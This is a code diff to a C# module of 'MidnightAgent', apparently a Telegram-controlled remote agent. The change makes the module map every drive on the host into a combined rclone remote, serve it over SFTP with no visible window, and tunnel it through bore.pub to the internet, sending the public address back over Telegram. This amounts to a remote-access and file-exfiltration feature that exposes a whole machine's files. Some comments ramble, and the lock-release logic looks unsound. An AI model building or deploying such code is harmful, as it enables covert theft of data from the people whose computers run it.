@@ -3,6 +3,9 @@ using System.Diagnostics;
 using System.IO;
 using System.IO.Compression;
 using System.Net;
+using System.Text;
+using System.Collections.Generic;
+using System.Linq;
 using System.Text.RegularExpressions;
 using System.Threading;
 using System.Threading.Tasks;
@@ -44,6 +47,20 @@ namespace MidnightAgent.Features
             if (args.Length == 0) return FeatureResult.Fail(Usage);
             string action = args[0].ToLower();
 
+            if (action == "stop")
+            {
+                // Force stop regardless of lock
+                await Task.Run(() => StopSftp(false));
+                
+                // Force release lock if it was held (reset semaphore)
+                if (_lock.CurrentCount == 0)
+                {
+                    try { _lock.Release(); } catch { }
+                }
+                
+                return FeatureResult.Ok("SFTP forced stop.");
+            }
+
             if (!_lock.Wait(0))
                 return FeatureResult.Fail("⚠️ FTP Task is busy.");
 
@@ -52,7 +69,16 @@ namespace MidnightAgent.Features
                 if (action == "start")
                 {
                     if (TelegramInstance == null)
+                    {
+                        // Lock was never acquired here because we checked before lock.Wait(0)
+                        // Wait... standard pattern is check, then wait.
+                        // Wait, previous code:
+                        // if (!_lock.Wait(0)) return ... 
+                        // So we HAVE the lock here.
+                        if (_lock.CurrentCount == 0)
+                            try { _lock.Release(); } catch { }
                         return FeatureResult.Fail("⚠️ Agent needs restart.");
+                    }
 
                     TelegramInstance?.SendMessage("🚀 <b>Starting SFTP Server...</b>");
 
@@ -64,26 +90,30 @@ namespace MidnightAgent.Features
                             TelegramInstance?.SendMessage($"❌ SFTP Error: {ex.Message}");
                             StopSftp(true);
                         }
-                        finally { _lock.Release(); }
+                        finally 
+                        { 
+                            // Always release lock when async task finishes
+                            try { _lock.Release(); } catch { }
+                        }
                     });
-
+                    
+                    // Don't release lock here, the async task holds it!
                     return FeatureResult.Ok("SFTP deployment started.");
-                }
-                else if (action == "stop")
-                {
-                    await Task.Run(() => StopSftp(false));
-                    _lock.Release();
-                    return FeatureResult.Ok("SFTP stopped.");
                 }
             }
             catch (Exception ex)
             {
-                _lock.Release();
+                // Only release if we haven't passed it to the background task
+                if (action != "start")
+                {
+                   try { _lock.Release(); } catch { }
+                }
                 return FeatureResult.Fail($"Error: {ex.Message}");
             }
-
-            _lock.Release();
-            return FeatureResult.Fail(Usage);
+            
+            // If we fall through (e.g. unknown command), release lock
+             try { _lock.Release(); } catch { }
+             return FeatureResult.Fail(Usage);
         }
 
         private async Task StartSftp()
@@ -131,20 +161,52 @@ namespace MidnightAgent.Features
                 ZipFile.ExtractToDirectory(Path.Combine(WorkingDir, "bore.zip"), WorkingDir);
             }
 
-            // 3.5 Create Rclone Config for "Local" backend (Access to all drives)
+            // 3.5 Create Rclone Config for All Drives (Combine Backend)
+            // This maps C:\ to /C/, D:\ to /D/, etc.
             string configPath = Path.Combine(WorkingDir, "rclone.conf");
-            File.WriteAllText(configPath, "[root]\ntype = local\n");
+            var sb = new StringBuilder();
+            var upstreams = new List<string>();
+
+            try
+            {
+                foreach (var drive in DriveInfo.GetDrives())
+                {
+                    if (drive.IsReady)
+                    {
+                        string letter = drive.Name.Substring(0, 1); // "C"
+                        string path = drive.Name.Replace("\\", "/"); // "C:/"
+                        
+                        sb.AppendLine($"[{letter}]");
+                        sb.AppendLine("type = local");
+                        sb.AppendLine($"path = {path}");
+                        sb.AppendLine();
+                        
+                        upstreams.Add($"{letter}={letter}:");
+                    }
+                }
+            }
+            catch {}
+
+            // The 'combine' remote
+            sb.AppendLine("[root]");
+            sb.AppendLine("type = combine");
+            sb.AppendLine($"upstreams = {string.Join(" ", upstreams)}");
+            
+            File.WriteAllText(configPath, sb.ToString());
 
             // 4. Start Rclone SFTP Server
-            // Serves root:/ which Rclone translates to all drives on Windows
+            // Serves the 'root' combine remote
             TelegramInstance?.SendMessage("📂 <b>(3/3) Launching Server...</b>");
+            
+            string logPath = Path.Combine(WorkingDir, "sftp_debug.log");
             
             var rcloneStart = new ProcessStartInfo
             {
                 FileName = rcloneExe,
-                // Use the config file and serve the 'root' remote
-                // Increased idle timeout to 1h to prevent disconnects
-                Arguments = $"serve sftp root:/ --config \"{configPath}\" --addr localhost:{INTERNAL_PORT} --user {SFTP_USER} --pass {SFTP_PASS} --vfs-cache-mode writes --no-auth=false --idle-timeout 1h",
+                // Change localhost to 127.0.0.1 to avoid IPv6 issues
+                // Add -v for logging
+                // serve sftp root: (points to [root] combined remote)
+                Arguments = $"serve sftp root: --config \"{configPath}\" --addr 127.0.0.1:{INTERNAL_PORT} --user {SFTP_USER} --pass {SFTP_PASS} --vfs-cache-mode full --no-auth=false",
                 CreateNoWindow = true,
                 UseShellExecute = false,
                 RedirectStandardOutput = true,
@@ -153,11 +215,29 @@ namespace MidnightAgent.Features
             
             _rcloneProcess = Process.Start(rcloneStart);
             
+            // Capture Rclone output to log file
+            Task.Run(() => 
+            {
+                try 
+                {
+                    while (_rcloneProcess != null && !_rcloneProcess.HasExited)
+                    {
+                        string line = _rcloneProcess.StandardError.ReadLine();
+                        if (line != null) 
+                        {
+                            try { File.AppendAllText(logPath, $"[RCLONE] {line}\n"); } catch {}
+                        }
+                    }
+                }
+                catch {}
+            });
+            
             // Check if rclone started immediately
             if (_rcloneProcess.WaitForExit(2000))
             {
-                string error = _rcloneProcess.StandardError.ReadToEnd();
-                throw new Exception($"Rclone exited early. Code: {_rcloneProcess.ExitCode}\nERR: {error}");
+                string error = "Process exited early";
+                try { error = File.ReadAllText(logPath); } catch {}
+                throw new Exception($"Rclone exited early. Code: {_rcloneProcess.ExitCode}\nLog: {error}");
             }
             
             // 5. Start Bore Tunnel
@@ -198,7 +278,7 @@ namespace MidnightAgent.Features
                 {
                     FileName = boreExe,
                     // Added --keep-alive to prevent timeouts
-                    Arguments = $"local {INTERNAL_PORT} --to {BORE_SERVER} --keep-alive",
+                    Arguments = $"local {INTERNAL_PORT} --to {BORE_SERVER}",
                     RedirectStandardOutput = true,
                     RedirectStandardError = true,
                     UseShellExecute = false,
@@ -208,8 +288,19 @@ namespace MidnightAgent.Features
 
             _boreProcess.OutputDataReceived += (s, e) =>
             {
-                if (e.Data != null)
+                if (!string.IsNullOrEmpty(e.Data))
                 {
+                    // Check for URL in stdout
+                    var match = Regex.Match(e.Data, @"(bore\.pub:\d+)");
+                    if (match.Success) url = match.Groups[1].Value;
+                }
+            };
+
+            _boreProcess.ErrorDataReceived += (s, e) =>
+            {
+                if (!string.IsNullOrEmpty(e.Data))
+                {
+                    // Check for URL in stderr
                     var match = Regex.Match(e.Data, @"(bore\.pub:\d+)");
                     if (match.Success) url = match.Groups[1].Value;
                 }
@@ -217,6 +308,7 @@ namespace MidnightAgent.Features
             
             _boreProcess.Start();
             _boreProcess.BeginOutputReadLine();
+            _boreProcess.BeginErrorReadLine();
             
             // Wait for URL
             for (int i = 0; i < 30 && url == null; i++)
